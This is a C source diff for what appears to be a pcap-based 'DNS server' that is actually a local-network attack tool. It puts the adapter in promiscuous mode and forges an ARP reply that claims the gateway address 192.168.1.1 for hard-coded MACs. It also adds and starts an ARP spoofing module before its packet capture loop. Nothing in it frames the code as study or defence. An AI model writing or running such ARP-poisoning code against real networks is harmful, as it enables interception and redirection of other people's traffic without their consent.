@@ -1,9 +1,11 @@
 #include <pcap.h>
 #include "../common/error/udo_error.h"
+#include "../common/core/udo_cont.h"
 #include "udo_link_layer.h"
 #include "udo_adapter.h"
 #include "udo_server_dns.h"
 #include "udo_arp.h"
+#include "udo_arp_spoofing.h"
 
 static char* str_cap = "rpcap://\\Device\\NPF_";
 
@@ -20,6 +22,7 @@ void udo_server_dns_init(udo_server_dns* self, char* dns_name)
 
 void udo_server_dns_run(void* arg)
 {
+	//关于网络访问层 应该放到适配器类中操作
 	udo_server_dns* self = (udo_server_dns*)arg; 
 	udo_adapter adapter;
 	char adapter_name[256] = "";
@@ -30,19 +33,18 @@ void udo_server_dns_run(void* arg)
 	const u_char *pkt_data;
 	int res = 0;
 
-	udo_adapter_init(&adapter, MIB_IF_TYPE_ETHERNET);
+	udo_adapter_init(&adapter, UDO_IF_TYPE_ETHERNET);
 	memcpy(adapter_name, str_cap, cap_len);
 	memcpy(&adapter_name[cap_len], udo_adapter_name(&adapter),
 		strlen(udo_adapter_name(&adapter)));
-	adhandle = pcap_open(adapter_name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
+	adhandle = pcap_open(adapter_name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, errbuf);
 	udo_assert_str(adhandle, errbuf);
 	
-
+	
 
 	udo_arp arp_spool;
-	udo_arp_init(&arp_spool);
+	udo_arp_init(&arp_spool,NULL);
 	udo_arp_setop(&arp_spool, UDO_ARP_RESPONSE);
-
 	udo_arp_setsma(&arp_spool, "f0:76:1c:13:ac:ed");
 	udo_arp_setsia(&arp_spool, "192.168.1.1");
 	udo_arp_setdma(&arp_spool, "08:23:b2:74:7c:a4");
@@ -67,6 +69,12 @@ void udo_server_dns_run(void* arg)
 	{
 		printf("send error\n");
 	}
+
+	udo_arp_spoofing arp_spoofing;
+	udo_arp_spoofing_init(&arp_spoofing, self, &adapter);
+	udo_arp_spoofing_start(&arp_spoofing);
+
+
 	while ((res = pcap_next_ex(adhandle, &header, &pkt_data)) >= 0)
 	{
 		if (res == 0)
@@ -89,7 +97,7 @@ void udo_server_dns_run(void* arg)
 				continue;
 			}
 			udo_arp arp;
-			udo_arp_init(&arp);
+			udo_arp_init(&arp,NULL);
 			udo_arp_deserialize(&arp, pkt_data, UDO_LINK_LAYER_LEN);
 			udo_arp_term(&arp);
 		}
